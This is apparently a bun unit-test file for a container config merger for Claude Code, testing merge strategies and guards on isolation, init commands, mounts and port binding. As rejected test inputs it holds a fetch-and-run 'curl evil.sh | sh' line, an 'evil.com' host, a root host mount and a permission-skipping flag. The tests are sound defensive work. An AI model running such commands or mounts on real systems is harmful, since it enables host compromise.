import { describe, expect, it } from 'bun:test';
import { mergeClaudes, mergeConfigs } from '../../../src/config/merger.ts';
import type { ProfileConfig } from '../../../src/types/index.ts';

function makeProfile(overrides: Partial<ProfileConfig> = {}): ProfileConfig {
  return {
    allowProjectHostMounts: false,
    allowProjectInit: false,
    auth: { keyEnv: 'ANTHROPIC_API_KEY', type: 'api-key' },
    claudeArgs: [],
    config: { path: '/tmp/cfg', source: 'local', sync: 'daily' },
    env: [],
    image: { use: 'ghcr.io/ccpod/base:latest' },
    init: [],
    isolation: false,
    name: 'base',
    network: { allow: [], policy: 'full' },
    plugins: [],
    ports: { autoDetectMcp: true, list: [] },
    services: {},
    ssh: { agentForward: true, mountSshDir: false },
    state: 'ephemeral',
    ...overrides,
  };
}

describe('mergeConfigs', () => {
  it('null project uses all profile defaults', () => {
    const result = mergeConfigs(makeProfile(), null);
    expect(result.profileName).toBe('base');
    expect(result.state).toBe('ephemeral');
    expect(result.network.policy).toBe('full');
    expect(result.autoDetectMcp).toBe(true);
  });

  it('state override takes precedence over profile', () => {
    const result = mergeConfigs(makeProfile({ state: 'persistent' }), null, {
      state: 'ephemeral',
    });
    expect(result.state).toBe('ephemeral');
  });

  it('deep merge: project network.allow appended to profile allow', () => {
    const profile = makeProfile({
      network: { allow: ['github.com'], policy: 'restricted' },
    });
    const result = mergeConfigs(profile, {
      merge: 'deep',
      network: { allow: ['npmjs.com'] },
    });
    expect(result.network.allow).toContain('github.com');
    expect(result.network.allow).toContain('npmjs.com');
  });

  it('override strategy: project network fully replaces profile network', () => {
    const profile = makeProfile({
      network: { allow: ['github.com'], policy: 'restricted' },
    });
    const result = mergeConfigs(profile, {
      merge: 'override',
      network: { policy: 'full' },
    });
    expect(result.network.policy).toBe('full');
    expect(result.network.allow).not.toContain('github.com');
  });

  it('port lists concatenate across profile and project', () => {
    const profile = makeProfile({
      ports: { autoDetectMcp: true, list: ['3000:3000'] },
    });
    const result = mergeConfigs(profile, { ports: { list: ['4000:4000'] } });
    expect(result.ports).toHaveLength(2);
    expect(result.ports[0]).toEqual({ container: 3000, host: 3000 });
    expect(result.ports[1]).toEqual({ container: 4000, host: 4000 });
  });

  it('project autoDetectMcp overrides profile', () => {
    const profile = makeProfile({ ports: { autoDetectMcp: true, list: [] } });
    const result = mergeConfigs(profile, { ports: { autoDetectMcp: false } });
    expect(result.autoDetectMcp).toBe(false);
  });

  it('env:{} — resolution deferred to run time (resolveEnvForwarding)', () => {
    // mergeConfigs intentionally returns env:{} — env forwarding keys are resolved
    // at run time by resolveEnvForwarding in run.ts, not at merge time.
    const profile = makeProfile({ env: ['FOO', 'BAR'] });
    const result = mergeConfigs(profile, { env: ['BAR', 'BAZ'] });
    expect(result.env).toEqual({});
  });

  it('parsePorts rejects malformed entries', () => {
    const profile = makeProfile({
      ports: { autoDetectMcp: false, list: [':3000'] },
    });
    expect(() => mergeConfigs(profile, null)).toThrow(
      'Invalid port mapping ":3000"',
    );
  });

  it('parsePorts rejects zero port values', () => {
    const profile = makeProfile({
      ports: { autoDetectMcp: false, list: ['0:3000'] },
    });
    expect(() => mergeConfigs(profile, null)).toThrow(
      'Invalid port mapping "0:3000"',
    );
  });

  it('deep merge: claudeArgs concatenates profile then project', () => {
    const profile = makeProfile({ claudeArgs: ['--verbose'] });
    const result = mergeConfigs(profile, {
      claudeArgs: ['--model', 'claude-opus-4-5'],
    });
    expect(result.claudeArgs).toEqual([
      '--verbose',
      '--model',
      'claude-opus-4-5',
    ]);
  });

  it('override strategy: project claudeArgs replaces profile', () => {
    const profile = makeProfile({ claudeArgs: ['--verbose'] });
    const result = mergeConfigs(profile, {
      claudeArgs: ['--dangerously-skip-permissions'],
      merge: 'override',
    });
    expect(result.claudeArgs).toEqual(['--dangerously-skip-permissions']);
  });

  it('override strategy with no project claudeArgs produces empty (clean slate)', () => {
    const profile = makeProfile({ claudeArgs: ['--verbose'] });
    const result = mergeConfigs(profile, { merge: 'override' });
    expect(result.claudeArgs).toEqual([]);
  });

  it('null project: claudeArgs comes from profile', () => {
    const profile = makeProfile({ claudeArgs: ['--verbose'] });
    const result = mergeConfigs(profile, null);
    expect(result.claudeArgs).toEqual(['--verbose']);
  });

  it('isolated profile ignores project network', () => {
    const profile = makeProfile({
      isolation: true,
      network: { allow: ['github.com'], policy: 'restricted' },
    });
    const result = mergeConfigs(profile, {
      network: { allow: ['evil.com'], policy: 'full' },
    });
    expect(result.network.policy).toBe('restricted');
    expect(result.network.allow).toEqual(['github.com']);
    expect(result.network.allow).not.toContain('evil.com');
  });

  it('isolated profile ignores project claudeArgs', () => {
    const profile = makeProfile({
      claudeArgs: ['--verbose'],
      isolation: true,
    });
    const result = mergeConfigs(profile, {
      claudeArgs: ['--injected-flag'],
    });
    expect(result.claudeArgs).toEqual(['--verbose']);
  });

  it('deep merge: init concatenates profile then project when opted in', () => {
    const profile = makeProfile({
      allowProjectInit: true,
      init: ['apt-get install -y jq'],
    });
    const result = mergeConfigs(profile, { init: ['npm install'] });
    expect(result.init).toEqual(['apt-get install -y jq', 'npm install']);
  });

  it('project init is ignored without allowProjectInit', () => {
    const profile = makeProfile({ init: ['apt-get install -y jq'] });
    const result = mergeConfigs(profile, { init: ['curl evil.sh | sh'] });
    expect(result.init).toEqual(['apt-get install -y jq']);
  });

  it('override strategy: project init replaces profile init when opted in', () => {
    const profile = makeProfile({
      allowProjectInit: true,
      init: ['apt-get install -y jq'],
    });
    const result = mergeConfigs(profile, {
      init: ['npm install'],
      merge: 'override',
    });
    expect(result.init).toEqual(['npm install']);
  });

  it('override strategy with no project init produces empty array', () => {
    const profile = makeProfile({ init: ['apt-get install -y jq'] });
    const result = mergeConfigs(profile, { merge: 'override' });
    expect(result.init).toEqual([]);
  });

  it('null project: init comes from profile', () => {
    const profile = makeProfile({ init: ['echo hello'] });
    const result = mergeConfigs(profile, null);
    expect(result.init).toEqual(['echo hello']);
  });

  it('isolated profile ignores project init', () => {
    const profile = makeProfile({ init: ['echo safe'], isolation: true });
    const result = mergeConfigs(profile, { init: ['echo injected'] });
    expect(result.init).toEqual(['echo safe']);
    expect(result.init).not.toContain('echo injected');
  });

  it('no init in profile or project produces empty array', () => {
    const result = mergeConfigs(makeProfile(), null);
    expect(result.init).toEqual([]);
  });

  it('dockerfile set without explicit use resolves image to "build"', () => {
    const profile = makeProfile({
      image: {
        dockerfile: '/path/to/Dockerfile',
        use: 'ghcr.io/ccpod/base:latest',
      },
    });
    const result = mergeConfigs(profile, null);
    expect(result.image).toBe('build');
    expect(result.dockerfile).toBe('/path/to/Dockerfile');
  });

  it('no dockerfile uses image.use directly', () => {
    const profile = makeProfile({
      image: { use: 'ghcr.io/ccpod/base:latest' },
    });
    const result = mergeConfigs(profile, null);
    expect(result.image).toBe('ghcr.io/ccpod/base:latest');
  });

  it('rejects project service host-path volume mount', () => {
    const profile = makeProfile();
    expect(() =>
      mergeConfigs(profile, {
        services: { evil: { image: 'alpine', volumes: ['/:/host:rw'] } },
      }),
    ).toThrow(/not a named volume/);
  });

  it('allows project service host-path mount with profile opt-in', () => {
    const profile = makeProfile({ allowProjectHostMounts: true });
    const result = mergeConfigs(profile, {
      services: { svc: { image: 'alpine', volumes: ['/tmp/x:/x'] } },
    });
    expect(result.services.svc?.volumes).toEqual(['/tmp/x:/x']);
  });

  it('rejects project service port bound to non-localhost IP', () => {
    const profile = makeProfile();
    expect(() =>
      mergeConfigs(profile, {
        services: {
          db: { image: 'postgres', ports: ['0.0.0.0:5432:5432'] },
        },
      }),
    ).toThrow(/binds to/);
  });

  it('localizes project service two-part port to 127.0.0.1', () => {
    const profile = makeProfile();
    const result = mergeConfigs(profile, {
      services: { db: { image: 'postgres', ports: ['5432:5432'] } },
    });
    expect(result.services.db?.ports).toEqual(['127.0.0.1:5432:5432']);
  });

  it('rejects project service single-part port (would publish on 0.0.0.0)', () => {
    const profile = makeProfile();
    expect(() =>
      mergeConfigs(profile, {
        services: { db: { image: 'postgres', ports: ['5432'] } },
      }),
    ).toThrow(/publish on all interfaces/);
  });

  it('accepts project service named-volume mount', () => {
    const profile = makeProfile();
    const result = mergeConfigs(profile, {
      services: { db: { image: 'postgres', volumes: ['dbdata:/var/lib/db'] } },
    });
    expect(result.services.db?.volumes).toEqual(['dbdata:/var/lib/db']);
  });

  it('accepts bracketed IPv6 loopback [::1] in project service ports', () => {
    const profile = makeProfile();
    const result = mergeConfigs(profile, {
      services: {
        db: { image: 'postgres', ports: ['[::1]:5432:5432'] },
      },
    });
    expect(result.services.db?.ports).toEqual(['[::1]:5432:5432']);
  });

  it('rejects bracketed IPv6 wildcard [::] in project service ports', () => {
    const profile = makeProfile();
    expect(() =>
      mergeConfigs(profile, {
        services: { db: { image: 'postgres', ports: ['[::]:5432:5432'] } },
      }),
    ).toThrow(/all IPv6 interfaces/);
  });

  it('rejects expanded IPv6 wildcard variants (e.g. [0::0])', () => {
    const profile = makeProfile();
    for (const ip of ['[0::]', '[::0]', '[0::0]', '[0:0:0:0:0:0:0:0]']) {
      expect(() =>
        mergeConfigs(profile, {
          services: {
            db: { image: 'postgres', ports: [`${ip}:5432:5432`] },
          },
        }),
      ).toThrow(/all IPv6 interfaces/);
    }
  });

  it('rejects non-loopback bracketed IPv6 in project service ports', () => {
    const profile = makeProfile();
    expect(() =>
      mergeConfigs(profile, {
        services: {
          db: { image: 'postgres', ports: ['[2001:db8::1]:5432:5432'] },
        },
      }),
    ).toThrow(/binds to 2001:db8::1/);
  });

  it('rejects syntactically invalid IPv6 with too many groups', () => {
    // 9 explicit groups around `::` is structurally invalid; must not be
    // silently accepted as loopback or wildcard.
    const profile = makeProfile();
    expect(() =>
      mergeConfigs(profile, {
        services: {
          db: {
            image: 'postgres',
            ports: ['[0:0:0:0:0::0:0:0:1]:5432:5432'],
          },
        },
      }),
    ).toThrow(/binds to 0:0:0:0:0::0:0:0:1/);
  });

  it('deduplicates network.allow when profile and project list the same host', () => {
    const profile = makeProfile({
      network: { allow: ['github.com', 'npmjs.com'], policy: 'restricted' },
    });
    const result = mergeConfigs(profile, {
      merge: 'deep',
      network: { allow: ['github.com', 'pypi.org'] },
    });
    // github.com should appear once, not twice
    expect(result.network.allow.filter((h) => h === 'github.com')).toHaveLength(
      1,
    );
    expect(result.network.allow).toContain('npmjs.com');
    expect(result.network.allow).toContain('pypi.org');
  });

  it('deep merge: per-service fields merge instead of replacing wholesale', () => {
    const profile = makeProfile({
      services: {
        db: {
          env: { POSTGRES_PASSWORD: 'fromprofile', POSTGRES_USER: 'admin' },
          image: 'postgres:17',
        },
      },
    });
    const result = mergeConfigs(profile, {
      services: {
        db: { env: { POSTGRES_DB: 'app' }, image: 'postgres:17' },
      },
    });
    // Project's POSTGRES_DB added; profile's POSTGRES_USER preserved.
    expect(result.services.db?.env).toEqual({
      POSTGRES_DB: 'app',
      POSTGRES_PASSWORD: 'fromprofile',
      POSTGRES_USER: 'admin',
    });
  });

  it('isolated profile: CLI state override still honoured', () => {
    const result = mergeConfigs(
      makeProfile({ isolation: true, state: 'persistent' }),
      { merge: 'override', services: { db: { image: 'postgres' } } },
      { state: 'ephemeral' },
    );
    expect(result.state).toBe('ephemeral');
    expect(Object.keys(result.services)).toHaveLength(0);
  });
});

describe('mergeClaudes', () => {
  it('appends project content below profile content', () => {
    const result = mergeClaudes('# Profile\nDo X', '# Project\nDo Y', 'append');
    expect(result).toContain('# Profile');
    expect(result).toContain('# Project');
    const profileIdx = result.indexOf('# Profile');
    const projectIdx = result.indexOf('# Project');
    expect(profileIdx).toBeLessThan(projectIdx);
  });

  it('overrides profile content with project content', () => {
    const result = mergeClaudes(
      '# Profile\nDo X',
      '# Project\nDo Y',
      'override',
    );
    expect(result).toBe('# Project\nDo Y');
    expect(result).not.toContain('# Profile');
  });
});
